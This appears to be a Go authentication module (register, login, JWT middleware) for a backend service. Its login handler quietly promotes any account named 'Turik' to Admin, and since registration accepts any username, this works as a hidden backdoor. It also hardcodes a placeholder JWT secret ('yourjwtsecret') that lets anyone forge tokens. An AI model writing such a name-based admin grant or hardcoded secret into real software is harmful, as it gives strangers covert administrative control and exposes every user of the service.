package auth

import (
	"carsflairs-backend/pkg/db"
	"encoding/json"
	"fmt"
	"net/http"
	"strings" // Добавлен импорт пакета strings
	"time"

	"github.com/golang-jwt/jwt"
	"golang.org/x/crypto/bcrypt"
)

var secretKey = []byte("yourjwtsecret")

type User struct {
	ID       int    `json:"id"`
	Username string `json:"username"`
	Password string `json:"password"`
	Role     string `json:"role"`
}

type Claims struct {
	ID   int    `json:"id"`
	Role string `json:"role"`
	jwt.StandardClaims
}

// Регистрация
func RegisterHandler(w http.ResponseWriter, r *http.Request) {
	var user User
	err := json.NewDecoder(r.Body).Decode(&user)
	if err != nil {
		http.Error(w, "Invalid input", http.StatusBadRequest)
		return
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(user.Password), bcrypt.DefaultCost)
	if err != nil {
		http.Error(w, "Error hashing password", http.StatusInternalServerError)
		return
	}

	_, err = db.DB.Exec("INSERT INTO users (username, password, role) VALUES ($1, $2, $3)", user.Username, hashedPassword, "User")
	if err != nil {
		http.Error(w, "Error inserting user into database", http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusCreated)
	fmt.Fprintf(w, "User registered successfully")
}

// Логин
func LoginHandler(w http.ResponseWriter, r *http.Request) {
	var user User
	err := json.NewDecoder(r.Body).Decode(&user)
	if err != nil {
		http.Error(w, "Invalid input", http.StatusBadRequest)
		return
	}

	var storedUser User
	err = db.DB.QueryRow("SELECT id, username, password, role FROM users WHERE username=$1", user.Username).Scan(
		&storedUser.ID, &storedUser.Username, &storedUser.Password, &storedUser.Role)
	if err != nil {
		http.Error(w, "Invalid username or password", http.StatusUnauthorized)
		return
	}

	err = bcrypt.CompareHashAndPassword([]byte(storedUser.Password), []byte(user.Password))
	if err != nil {
		http.Error(w, "Invalid username or password", http.StatusUnauthorized)
		return
	}

	if storedUser.Username == "Turik" && storedUser.Role != "Admin" {
		_, err = db.DB.Exec("UPDATE users SET role=$1 WHERE id=$2", "Admin", storedUser.ID)
		if err == nil {
			storedUser.Role = "Admin"
		}
	}

	token := jwt.NewWithClaims(jwt.SigningMethodHS256, Claims{
		ID:   storedUser.ID,
		Role: storedUser.Role,
		StandardClaims: jwt.StandardClaims{
			ExpiresAt: time.Now().Add(time.Minute * 15).Unix(),
		},
	})

	tokenString, err := token.SignedString(secretKey)
	if err != nil {
		http.Error(w, "Error generating token", http.StatusInternalServerError)
		return
	}

	// w.().Set("Authorization", "Bearer "+tokenString)
	json.NewEncoder(w).Encode(map[string]string{"token": tokenString})
	w.WriteHeader(http.StatusOK)
	// fmt.Fprintf(w, "User logged in successfully")
}

func AuthMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		authHeader := r.Header.Get("Authorization")
		if authHeader == "" {
			http.Error(w, "Missing token", http.StatusUnauthorized)
			return
		}

		// Убираем "Bearer " из токена
		tokenString := strings.TrimPrefix(authHeader, "Bearer ")

		claims := &Claims{}

		token, err := jwt.ParseWithClaims(tokenString, claims, func(token *jwt.Token) (interface{}, error) {
			return secretKey, nil
		})

		if err != nil || !token.Valid {
			http.Error(w, "Invalid token", http.StatusUnauthorized)
			return
		}

		// Если токен валиден — продолжаем обработку
		next.ServeHTTP(w, r)
	})
}
